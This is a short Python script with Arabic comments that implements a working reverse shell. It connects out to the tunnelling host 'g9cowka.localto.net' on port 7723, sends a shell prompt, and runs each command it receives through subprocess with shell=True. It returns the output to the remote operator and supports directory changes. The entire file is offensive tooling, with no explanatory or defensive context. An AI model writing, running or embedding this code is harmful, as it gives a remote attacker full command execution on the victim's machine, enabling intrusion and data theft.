import socket
import subprocess
import os

# إعداد معلومات الاتصال
HOST = 'g9cowka.localto.net'
PORT = 7723
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# إرسال رسالة عند نجاح الاتصال
s.send(b"[*] Connection Established!\n")

while True:
    # إرسال الدليل الحالي
    s.send(os.getcwd().encode() + b"> ")
    data = s.recv(1024).decode("utf-8").strip()

    if data.lower() == "quit":
        break
    elif data.startswith("cd"):
        try:
            os.chdir(data.split(" ")[1])
        except FileNotFoundError as e:
            s.send(str(e).encode())
    else:
        # تنفيذ الأمر وإرسال النتائج
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value, stderr_value = proc.communicate()
        output_str = stdout_value + stderr_value
        s.send(output_str)

s.close()
